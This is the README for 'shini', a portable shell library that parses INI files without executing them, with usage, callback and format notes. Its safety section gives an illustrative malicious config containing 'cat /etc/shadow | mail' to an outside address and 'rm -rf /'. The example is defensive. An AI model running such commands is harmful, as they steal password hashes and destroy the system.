shini [![Build Status](https://travis-ci.org/wallyhall/shini.svg?branch=master)](https://travis-ci.org/wallyhall/shini)
=====

A small, minimialist, portable `/bin/sh` routine for reading (and in the upcoming v2.0 - writing) INI files.

## About

### What is `shini`?
As above.  It's a small set of functions written for inclusion in shell scripts, released under the MIT license.

### Why do I need it?
You probably don't.  But if you have or ever do find yourself writing a shell script which:
 * Needs system or user specific settings
 * Needs to read an existing INI file

... then you might find `shini` saves you a lot of time, and makes things safer.

### How can it make things safer?
Because system and user specific settings in shell scripts usually end up implemented as:

```
# /usr/local/sbin/rootonlyscript
. /etc/myscript
if [ -n SETTING1 ]; then
  echo "You didn't specify SETTING1" 1>&2
fi
```

The settings file looks like:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'
```
... and everything is cool until *this* happens:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'
cat /etc/shadow | mail someone@wishyouwerehere.com
rm -rf /
```

Alas, bye bye shadow file - bye bye system.

`shini` only reads the file; never includes, interprets or executes it.  A better solution.

### So `shini` just makes my shell script secure?

Erm, no.  Please go away and learn to code before proceeding.

Remember:
 * Your config file must always have sane file permissions - even if its an INI file
 * `shini` is to be included in your script - so it should be located somewhere safe, and with read-only permissions

Best advice, if in doubt:

```
sudo chown root:root shini.sh
sudo chmod 644 shini.sh
```

## Usage

### Show me `shini`!

To see `shini` in action in under 2 minutes:

```
cd "$(mktemp -d -t shini)"
curl https://codeload.github.com/wallyhall/shini/tar.gz/master -o master.tar.gz
tar -xvzf master.tar.gz
chmod +x shini-master/example.sh
cd shini-master/
sh example.sh
```

You should be presented with some output like this:

```
Parsing...

  Section1.name='John Doe'
  Section1.organization='Acme Widgets Inc.'
  Section2.server='10.1.2.3'
  Section2.port='80'
  Section2.file='payroll.dat'
  Section2.this_value_was_in_hex='8739'
  Another_Section.test_key_22='test test test'
  Another_Section.var_with_leading_whitespace='value'
  Another_Section.whitespace_test='lots of whitespace'
  Another_Section.quoted_quotespace='  lots more whitespace  '
  Whitespace_Section.null_value=''

Complete.
```

You've just execute the shipped example/test script (`example.sh`) - which parses an example INI file (`example.ini`) - outputting the content in the format `[section].[key]=[value]`.

## Cool.  Now show me how to include and use it myself!

Inclusion of `shini` in your own project is easy.  You can put the content of `shini.sh` inline with your own code (not recommended, but acceptable.  Make sure you appropriately include the MIT license...), or 'source' it externally - i.e.:

```
. "$(dirname "$0")/shini.sh"
. "/usr/local/bin/shini.sh"
... etc
```

`shini` works by parsing INI files line by line - skipping comments and invoking callback functions on errors and parsed values.

If you don't care about handling parse errors (`shini` will do this for you by default) then you only need define one callback function:

```
__shini_parsed ()
{
  # "$1" - section
  # "$2" - key
  # "$3" - value
}
```

Each argument can should be carefully handled - always double quote (unless you're certain what you're doing).  Never forget you can't guraruntee what is in the INI file being parsed - it could be with evil intent.

When you're ready, invoke the parse function:

```
shini_parse "settings.ini"
```

Bingo.  A full (and simple example) can be found in `example.sh`.

### Can I override the error handling?

Yes.  Just declare any or all of the following functions:

```
__shini_parse_error $LINE_NUM "$LINE"  # Error parsing a specific line
__shini_no_file_passed                 # No filename passed to the shini_parse()
__shini_file_unreadable "$INI_FILE"    # INI file wasn't readable (or wasn't a file)
```

## Known caveats, etc

### Does `shini` follow the official INI format standards?

There are no INI format standards - so yes it does and no it doesn't?

`shini` assumes:

 * Every declaration is on a new line
 * __Sections__ are contained in square brackets, and include `a-z`, `A-Z`, `0-9`, `-` and `_` (no spaces by default) - e.g. `[section]`
 * __Keys__ are followed by an assignment (equal) sign, and include `a-z`, `A-Z`, `0-9`, `-` and `_` (again, no spaces by default) - e.g. `key=`
 * __Values__ follow keys, on the same line.  Anything is valid, except double quotes and semi-colons.  Hexadecimal values (i.e. `0x123`) are parsed and converted to decimal for you.
 * __Comments__ are lines starting with a semi-colon (`;`), such lines are ignored.
 * __Whitespace__ is ignored everywhere - except in between non-whitespace characters in values.  Use double quotes (`"`) to be explicit (e.g. `key=" leading/trailing WS "`)

Due to portability constraints - some of the useful regex power isn't available to `shini`.

This caused some trade-offs - with a lack of efficient control over lazy vs greedy repeats and optional groups etc, comments can only follow key/pair values and empty lines (not sections) - and where it follows values, any whitespace between the value and semi-colon is included as the value.  Explicitly use of double-quotes around the value gets around this issue.

Additionally if your key/value declaration looks like this:

```
key="value" "more text" ; comment
```

... the value reads literally:

```
"value" "more text" ; comment
```

Otherwise, all known "obviously invalid" INI content gets picked up and reported.
